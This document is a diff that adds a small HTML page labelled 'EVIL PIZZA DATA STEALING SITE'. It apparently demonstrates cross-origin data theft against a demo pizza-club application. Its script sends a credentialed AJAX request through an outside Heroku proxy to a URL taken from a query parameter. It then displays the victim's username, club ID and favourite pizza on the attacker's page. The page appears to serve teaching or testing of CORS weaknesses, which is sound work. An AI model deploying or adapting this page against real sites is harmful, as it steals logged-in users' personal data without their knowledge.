@@ -1,0 +1,44 @@
+<head>
+<script src="http://code.jquery.com/jquery-3.1.1.js"></script>
+<script>
+function getParameterByName(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");
+    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+}
+$.ajaxSetup({withCredentials:true})
+$(function(){
+  var target_url = getParameterByName('url');
+  $.ajax({
+    url:"https://immense-fortress-67240.herokuapp.com/"+target_url,
+    success:writeData,
+    xhrFields: {
+      withCredentials: true
+    }
+  });
+});
+function writeData(data){
+  var name=data.username;
+  var pizzaID = data.pizzaClubId;
+  var favoritePizza = data.favoritePizza;
+  $('#data').append(`\
+  Name: ${name}<br>\
+  Pizza of The Month ID:${pizzaID}<br>\
+  Favorite Pizza: ${favoritePizza}<br>`)
+}
+
+</script>
+</head>
+<body>
+<h1>EVIL PIZZA DATA STEALING SITE</h1>
+<div id="data">
+</div>
+</body>
+
+
+
+
